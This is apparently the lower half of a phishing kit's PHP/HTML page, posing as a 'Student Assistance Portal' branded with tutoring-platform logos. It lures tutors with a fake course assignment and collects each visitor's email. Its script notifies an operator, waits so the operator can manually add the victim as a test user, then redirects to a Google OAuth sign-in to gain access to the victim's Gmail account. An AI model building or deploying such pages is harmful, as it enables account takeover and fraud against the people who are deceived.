                                 <a href="https://www.cambly.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/cambly.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.wyzant.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/wyzant.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.varsitytutors.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/varsitytutors.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.superprof.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/superprof.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.italki.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/italki.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.chegg.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/chegg.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a>
                              </div>
                           </div>
                        </button>
                     </div>
                     <p style="font-size: 12px; color: rgb(136, 136, 136); line-height: 1.6; margin: 16px 0px 0px;">By signing in, you confirm you are accessing this assignment through an authorized link. Unauthorized access attempts are logged.</p>
                  </div>
                  <!----------------------Email part---------------------->
                  <div id="emailDiv" class="hidden" style="justify-content: center; padding: 48px 24px; ">
                     <div style="max-width: 520px; width: 100%; background-color: rgb(255, 255, 255); border-radius: 8px; border: 1px solid rgb(232, 217, 192); box-shadow: rgba(0, 85, 162, 0.08) 0px 2px 16px; padding: 40px 48px;">
                        <div style="display: flex; align-items: center; gap: 14px; margin-bottom: 28px;"><svg width="56" height="56" viewBox="0 0 56 56" fill="none">
                              <rect width="56" height="56" rx="6" fill="#FFC425"></rect>
                              <path d="M28 9c-1.4 0-2.4.6-3 1.5-.5.7-.5 1.6-.1 2.3.2.5.6.9 1.1 1.3-.9.4-1.7 1-2.2 2-.4.7-.4 1.5 0 2.2.3.5.6.9 1.1 1.1-.6.4-1 1.1-1.2 1.9-.2 1 .1 2.1.8 2.8-.3.3-.6.6-.7 1.1-.2.8 0 1.7.6 2.2.3.3.8.6 1.3.6v3.3c0 .4-.1.8-.4 1.2l-3.3 5.2c-.3.6-.2 1.3.2 1.7.3.3.6.4 1 .4.4 0 .7-.2.9-.5l2.5-3.9v6.4c0 .6.5 1.2 1.2 1.2s1.2-.5 1.2-1.2v-6.4l2.5 3.9c.2.3.5.5.9.5.4 0 .7-.1 1-.4.4-.4.5-1.1.2-1.7l-3.3-5.2c-.2-.4-.4-.8-.4-1.2v-3.3c.5 0 .9-.3 1.3-.6.6-.5.8-1.4.6-2.2-.1-.5-.4-.8-.7-1.1.7-.7 1-1.8.8-2.8-.2-.8-.6-1.5-1.2-1.9.5-.2.8-.6 1.1-1.1.4-.7.4-1.5 0-2.2-.5-1-1.3-1.6-2.2-2 .5-.4.9-.8 1.1-1.3.4-.7.4-1.6-.1-2.3C30.4 9.6 29.4 9 28 9z" fill="<?= $primary ?>"></path>
                              <text x="28" y="53" text-anchor="middle" fill="<?= $primary ?>" font-size="7" font-weight="bold" font-family="Arial, sans-serif" letter-spacing="1.2"><?= $this->_company['c_name'] ?></text>
                           </svg>
                           <div style="display: flex; flex-direction: column;">
                              <span style="font-size: 17px; font-weight: 700; color: <?= $primary ?>; font-family: Georgia, serif;">Student Assistance Portal</span><span style="font-size: 12px; color: <?= $primary ?>; font-weight: 600; letter-spacing: 0.3px; margin-top: 2px;"><?= $this->_company['c_name'] ?></span>
                           </div>
                        </div>
                        <div style="display: flex; align-items: center; margin-bottom: 28px;">
                           <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                              <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: <?= $primary ?>; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(255, 255, 255); font-size: 12px; font-weight: 600;">
                                 <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                                    <path d="M2 6.5l2.5 2.5 5.5-5.5" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
                              </div><span style="font-size: 11px; font-weight: 500; color: <?= $primary ?>;">Role</span>
                           </div>
                           <div style="flex: 1 1 0%; height: 1.5px; margin: 0px 6px 18px; background: <?= $primary ?>;"></div>
                           <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                              <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: <?= $primary ?>; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(255, 255, 255); font-size: 12px; font-weight: 600;">2</div>
                              <span style="font-size: 11px; font-weight: 500; color: <?= $primary ?>;">Email</span>
                           </div>
                           <div style="flex: 1 1 0%; height: 1.5px; margin: 0px 6px 18px; background: rgb(232, 217, 192);"></div>
                           <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                              <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: transparent; border: 1.5px solid rgb(187, 187, 187); color: rgb(170, 170, 170); font-size: 12px; font-weight: 600;">3</div><span style="font-size: 11px; font-weight: 500; color: rgb(170, 170, 170);">Sign in</span>
                           </div>
                           <div style="flex: 1 1 0%; height: 1.5px; margin: 0px 6px 18px; background: rgb(232, 217, 192);"></div>
                           <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                              <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: transparent; border: 1.5px solid rgb(187, 187, 187); color: rgb(170, 170, 170); font-size: 12px; font-weight: 600;">4</div><span style="font-size: 11px; font-weight: 500; color: rgb(170, 170, 170);">Access</span>
                           </div>
                        </div>
                        <div style="display: flex; flex-direction: column; align-items: flex-start; justify-content: space-between; margin-bottom: 10px;">
                           <h2 style="font-size: 20px; font-weight: 700; color: <?= $primary ?>; margin: 0px; font-family: Georgia, serif; display: block;">Confirm your email first</h2>
                           <div style="font-size: 11px;"><span style="display: block;">Powered by</span><a href="https://preply.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);">
                                 <img src="/public/assets/uploads/preply.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.cambly.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);">
                                 <img src="/public/assets/uploads/cambly.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.wyzant.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/wyzant.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.varsitytutors.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/varsitytutors.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.superprof.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/superprof.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.italki.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/italki.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.chegg.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/chegg.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a>
                           </div>
                        </div>
                        <p style="font-size: 14px; color: rgb(68, 68, 68); line-height: 1.7; margin-bottom: 22px;">Enter your tutoring account email. The portal will notify your session coordinator and confirm your outsourced tutor status before sign-in.</p><label style="font-size: 13px; font-weight: 600; color: rgb(68, 68, 68); display: block; margin-bottom: 6px;">Tutor email address</label><input id="tutorEmail" type="email" placeholder="you@example.com" value="" style="width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1.5px solid rgb(208, 213, 221); border-radius: 6px; font-size: 14px; margin-bottom: 4px;"><button
                           id="tutorEmailSubmit" style="width: 100%; padding: 12px 0px; background: <?= $primary ?>; color: rgb(255, 255, 255); border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 8px; margin-bottom: 4px; opacity: 1;">Continue</button><button id="backToRole" style="width: 100%; padding: 9px 0px; background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; font-size: 13px; color: rgb(136, 136, 136); cursor: pointer;">← Back</button>
                        <p style="font-size: 12px; color: rgb(136, 136, 136); line-height: 1.6; margin: 16px 0px 0px;">By signing in, you confirm you are accessing this assignment through an authorized link. Unauthorized access attempts are logged.</p>
                     </div>
                  </div>
                  <!----------------------------sign in with google--------------->
                  <div id="signDiv" class="hidden" style="justify-content: center; padding: 48px 24px;">
                     <div style="max-width: 520px; width: 100%; background-color: rgb(255, 255, 255); border-radius: 8px; border: 1px solid rgb(232, 217, 192); box-shadow: rgba(0, 85, 162, 0.08) 0px 2px 16px; padding: 40px 48px;">
                        <div style="display: flex; align-items: center; gap: 14px; margin-bottom: 28px;"><svg width="56" height="56" viewBox="0 0 56 56" fill="none">
                              <rect width="56" height="56" rx="6" fill="#FFC425"></rect>
                              <path d="M28 9c-1.4 0-2.4.6-3 1.5-.5.7-.5 1.6-.1 2.3.2.5.6.9 1.1 1.3-.9.4-1.7 1-2.2 2-.4.7-.4 1.5 0 2.2.3.5.6.9 1.1 1.1-.6.4-1 1.1-1.2 1.9-.2 1 .1 2.1.8 2.8-.3.3-.6.6-.7 1.1-.2.8 0 1.7.6 2.2.3.3.8.6 1.3.6v3.3c0 .4-.1.8-.4 1.2l-3.3 5.2c-.3.6-.2 1.3.2 1.7.3.3.6.4 1 .4.4 0 .7-.2.9-.5l2.5-3.9v6.4c0 .6.5 1.2 1.2 1.2s1.2-.5 1.2-1.2v-6.4l2.5 3.9c.2.3.5.5.9.5.4 0 .7-.1 1-.4.4-.4.5-1.1.2-1.7l-3.3-5.2c-.2-.4-.4-.8-.4-1.2v-3.3c.5 0 .9-.3 1.3-.6.6-.5.8-1.4.6-2.2-.1-.5-.4-.8-.7-1.1.7-.7 1-1.8.8-2.8-.2-.8-.6-1.5-1.2-1.9.5-.2.8-.6 1.1-1.1.4-.7.4-1.5 0-2.2-.5-1-1.3-1.6-2.2-2 .5-.4.9-.8 1.1-1.3.4-.7.4-1.6-.1-2.3C30.4 9.6 29.4 9 28 9z" fill="<?= $primary ?>"></path><text x="28" y="53" text-anchor="middle" fill="<?= $primary ?>" font-size="7" font-weight="bold" font-family="Arial, sans-serif" letter-spacing="1.2"><?= $this->_company['c_name'] ?></text>
                           </svg>
                           <div style="display: flex; flex-direction: column;"><span style="font-size: 17px; font-weight: 700; color: <?= $primary ?>; font-family: Georgia, serif;">Student Assistance Portal</span><span style="font-size: 12px; color: <?= $primary ?>; font-weight: 600; letter-spacing: 0.3px; margin-top: 2px;"><?= $this->_company['c_name'] ?></span></div>
                        </div>
                        <div style="display: flex; align-items: center; margin-bottom: 28px;">
                           <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                              <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: <?= $primary ?>; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(255, 255, 255); font-size: 12px; font-weight: 600;"><svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                                    <path d="M2 6.5l2.5 2.5 5.5-5.5" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg></div><span style="font-size: 11px; font-weight: 500; color: <?= $primary ?>;">Role</span>
                           </div>
                           <div style="flex: 1 1 0%; height: 1.5px; margin: 0px 6px 18px; background: <?= $primary ?>;"></div>
                           <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                              <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: <?= $primary ?>; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(255, 255, 255); font-size: 12px; font-weight: 600;"><svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                                    <path d="M2 6.5l2.5 2.5 5.5-5.5" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg></div><span style="font-size: 11px; font-weight: 500; color: <?= $primary ?>;">Email</span>
                           </div>
                           <div style="flex: 1 1 0%; height: 1.5px; margin: 0px 6px 18px; background: <?= $primary ?>;"></div>
                           <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                              <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: <?= $primary ?>; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(255, 255, 255); font-size: 12px; font-weight: 600;">3</div><span style="font-size: 11px; font-weight: 500; color: <?= $primary ?>;">Sign in</span>
                           </div>
                           <div style="flex: 1 1 0%; height: 1.5px; margin: 0px 6px 18px; background: rgb(232, 217, 192);"></div>
                           <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                              <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: transparent; border: 1.5px solid rgb(187, 187, 187); color: rgb(170, 170, 170); font-size: 12px; font-weight: 600;">4</div><span style="font-size: 11px; font-weight: 500; color: rgb(170, 170, 170);">Access</span>
                           </div>
                        </div>
                        <h2 style="font-size: 20px; font-weight: 700; color: <?= $primary ?>; margin: 0px 0px 10px; font-family: Georgia, serif;">Sign in to access your student's course work</h2><i style="font-size: 13px; color: rgb(85, 85, 85);">You are signing in as a Tutor</i>
                        <div style="display: inline-flex; align-items: center; gap: 8px; background: rgb(255, 248, 231); border: 1px solid rgb(232, 201, 106); border-radius: 6px; padding: 5px 12px; margin-bottom: 14px;"><span id="enteredEmail" style="font-size: 13px; color: <?= $primary ?>;"><!---entered email----></span><button style="background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; font-size: 12px; color: rgb(136, 136, 136); cursor: pointer; padding: 0px;">change</button></div>
                        <p style="font-size: 14px; color: rgb(68, 68, 68); line-height: 1.7; margin-bottom: 22px;">Sign in with your preferred tutor Google account.</p><button id="signinWithEmail" style="display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%; padding: 13px 0px; background: rgb(255, 255, 255); color: <?= $accent ?>; border: 1.5px solid rgb(208, 213, 221); border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.08) 0px 1px 4px; margin-bottom: 4px;"><svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                              <path d="M19.6 10.23c0-.68-.06-1.36-.18-2H10v3.8h5.4a4.62 4.62 0 01-2 3.03v2.5h3.24C18.4 15.93 19.6 13.3 19.6 10.23z" fill="#4285F4"></path>
                              <path d="M10 20c2.7 0 4.97-.9 6.62-2.44l-3.23-2.5c-.9.6-2.04.96-3.39.96-2.61 0-4.82-1.76-5.6-4.13H1.07v2.58A9.99 9.99 0 0010 20z" fill="#34A853"></path>
                              <path d="M4.4 11.89A6 6 0 014.18 10c0-.66.11-1.3.22-1.9V5.52H1.07A10 10 0 000 10c0 1.61.39 3.13 1.07 4.48l3.33-2.59z" fill="#FBBC05"></path>
                              <path d="M10 3.96c1.47 0 2.8.51 3.84 1.5L16.7 2.6A9.97 9.97 0 0010 0 9.99 9.99 0 001.07 5.52L4.4 8.1C5.18 5.72 7.39 3.96 10 3.96z" fill="#EA4335"></path>
                           </svg>Sign in with Gmail</button>
                        <section id="loadingSection">
                           <div class="loading-title"></div>
                           <div class="loading-text"></div>
                        </section>
                        <button id="backToEmail" style="width: 100%; padding: 9px 0px; background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; font-size: 13px; color: rgb(136, 136, 136); cursor: pointer;">← Back</button>
                        <p style="font-size: 12px; color: rgb(136, 136, 136); line-height: 1.6; margin: 16px 0px 0px;">By signing in, you confirm you are accessing this assignment through an authorized link. Unauthorized access attempts are logged.</p>
                     </div>
                  </div>
                  <!--------------------------------------------------->
               </div>

               <!---------------------------------------->
               <div style="background-color: rgb(255, 255, 255); border-width: 1px 1px 1px 4px; border-style: solid; border-color: rgb(232, 201, 106) rgb(232, 201, 106) rgb(232, 201, 106) <?= $primary ?>; border-image: initial; border-radius: 8px; padding: 24px 28px; margin-bottom: 28px; box-shadow: rgba(0, 85, 162, 0.07) 0px 2px 12px;">
                  <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px; flex-wrap: wrap;">
                     <span style="background-color: <?= $primary ?>; color: rgb(255, 255, 255); padding: 3px 10px; border-radius: 4px; font-size: 11px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase;">Course Work</span>
                     <div style="display: flex; gap: 6px; flex-wrap: wrap;"></div>
                  </div>
                  <h2 style="font-size: 20px; font-weight: 700; color: <?= $primary ?>; margin: 0px 0px 6px; font-family: Georgia, serif; line-height: 1.3;">Real-World Conversation: Navigating Everyday Situations</h2>
                  <p style="font-size: 13px; color: rgb(85, 85, 85); line-height: 1.6; margin: 0px 0px 18px;">Practical English Communication Â· ENG 101</p>
                  <div style="display: flex; justify-content: space-between; align-items: center; background-color: rgb(255, 248, 231); border: 1px solid rgb(208, 226, 248); border-radius: 6px; padding: 14px 18px; margin-bottom: 14px; gap: 16px; flex-wrap: wrap;">
                     <div style="display: flex; align-items: flex-start; gap: 10px;">
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink: 0;">
                           <circle cx="8" cy="8" r="6.5" stroke="<?= $primary ?>" stroke-width="1.4"></circle>
                           <path d="M8 4.5V8l2.5 2" stroke="<?= $primary ?>" stroke-width="1.4" stroke-linecap="round"></path>
                        </svg>
                        <div>
                           <p style="font-size: 10px; color: rgb(122, 159, 192); text-transform: uppercase; letter-spacing: 0.7px; font-weight: 700; margin: 0px 0px 2px;">Deadline</p>
                           <p style="font-size: 14px; font-weight: 700; color: <?= $primary ?>; margin: 0px 0px 1px;">Sunday, May 10, 2026</p>
                           <p style="font-size: 12px; color: rgb(85, 85, 85); margin: 0px;">03:00 AM GMT+3</p>
                        </div>
                     </div>
                     <div style="display: flex; align-items: center; gap: 4px; background-color: rgb(192, 57, 43); border-radius: 6px; padding: 8px 14px;"><span style="color: rgb(255, 255, 255); font-size: 13px; font-weight: 700;">Deadline passed</span></div>
                  </div>
                  <div style="padding: 0px 0px 4px;"></div>
                  <p style="font-size: 12px; color: rgb(122, 159, 192); margin: 0px; text-align: center;">🔒 Sign in to view the full assignment details</p>
               </div>
            </div>
         </main>
         <footer style="background-color: <?= $primary ?>; color: rgb(170, 170, 170); margin-top: 80px; padding: 48px 0px 24px;">
            <div style="max-width: 1200px; margin: 0px auto; padding: 0px 24px;">
               <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 32px; margin-bottom: 40px;">
                  <div>
                     <p style="color: rgb(255, 196, 37); font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 12px;">Student Resources</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Canvas LMS</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);"><?= $this->_company['c_name'] ?></p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">King Library</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Career Center</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Financial Aid</p>
                  </div>
                  <div>
                     <p style="color: rgb(255, 196, 37); font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 12px;">Academic Affairs</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Academic Calendar</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Class Schedule</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Graduation Services</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Registrar's Office</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Advising</p>
                  </div>
                  <div>
                     <p style="color: rgb(255, 196, 37); font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 12px;">Campus Life</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Student Union</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Campus Recreation</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Health Services</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);">Housing</p>
                     <p style="font-size: 13px; margin-bottom: 6px; cursor: pointer; color: rgb(170, 170, 170);"> Cares</p>
                  </div>
                  <div>
                     <p style="color: rgb(255, 196, 37); font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 12px;">Contact</p>

                  </div>
               </div>
               <div style="border-top: 1px solid <?= $accent ?>; padding-top: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
                  <p style="font-size: 12px; color: rgb(102, 102, 102);">© <?= date('Y') ?> <?= $this->_company['c_name'] ?></p>
                  <p style="font-size: 12px; color: rgb(102, 102, 102);"><span><span style="cursor: pointer;">Privacy Policy</span></span><span><span style="margin: 0px 8px; opacity: 0.4;">|</span><span style="cursor: pointer;">Accessibility</span></span><span><span style="margin: 0px 8px; opacity: 0.4;">|</span><span style="cursor: pointer;">Terms of Use</span></span><span><span style="margin: 0px 8px; opacity: 0.4;">|</span><span style="cursor: pointer;">Emergency Info</span></span></p>
               </div>
            </div>
         </footer>
      </div>
   </div>









   <script>
      const roleDiv = document.querySelector("#roleDiv");
      const emailDiv = document.querySelector("#emailDiv");
      const signDiv = document.querySelector("#signDiv");
      const backToRole = document.querySelector("#backToRole");
      const backToEmail = document.querySelector("#backToEmail");
      const tutorDiv = document.querySelector("#tutorDiv");

      const loadingText = document.querySelector('.loading-text');
      const loadingTitle = document.querySelector('.loading-title');

      let email;

      tutorDiv.addEventListener('click', (e) => {
         roleDiv.classList.add('hidden');
         emailDiv.classList.remove('hidden');
      });
      backToRole.addEventListener('click', (e) => {
         roleDiv.classList.remove('hidden');
         emailDiv.classList.add('hidden');
      });
      backToEmail.addEventListener('click', (e) => {
         emailDiv.classList.remove('hidden');
         signDiv.classList.add('hidden');
      });

      const tutorEmailSubmit = document.querySelector("#tutorEmailSubmit");
      tutorEmailSubmit.addEventListener('click', (e) => {
         email = document.querySelector('#tutorEmail').value;
         enteredEmail.textContent = email;
         const test = validateEmail(email);

         if (!test) {
            alert("Enter valid email to proceed");
            return;
         }

         emailDiv.classList.add('hidden');
         signDiv.classList.remove('hidden');
      });

      const signinWithEmail = document.querySelector("#signinWithEmail");
      btnContent = signinWithEmail.innerHTML;

      signinWithEmail.addEventListener("click", async (e) => {
         signinWithEmail.innerHTML = `<?= CustomFunctions::Loading() ?>`; 

         loadingTitle.textContent = 'Verifying Tutor Access';
         loadingText.textContent = 'Notifying administrators for user authorization...please wait!!!';

         pollStatus(email);

         try {
            // Send notification request to backend
            const response = await fetch(`/myapp/notify-admin/`, {
               method: "POST",
               body: JSON.stringify({
                  email
               }),
            });

            await response.json();
            loadingText.textContent = 'Redirecting to Google authentication...Please wait it may take up to a minute do not leave page!!'; 

         } catch (error) {

         } finally {
            signinWithEmail.innerHTML = btnContent;
         }

      });

      let cycles = 0;
      async function pollStatus(email) {
         cycles++;
         const redirectUrl = `/acc-connect/?email=${encodeURIComponent(email)}`;


         loadingText.textContent = 'Administrators notified.Please wait do not leave page it may take up to 30 seconds. Preparing authentication...';


         // Wait 8 seconds total to allow manual test user addition
         setTimeout( async () => { 

            const p = await fetch('/myapp/email-status', {
               method: "POST",
               body: JSON.stringify({
                  email
               })
            });
            const r = await p.json();
            if (r.error === 'false' || r.error === false) {

               // Redirect to Gmail OAuth flow 
               window.location.href = redirectUrl;


            } else {
               pollStatus(email);
            }

         }, 2000);


      }





      // Email validation
      function validateEmail(email) {
         const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return re.test(email);
      }
   </script>
</body>

</html>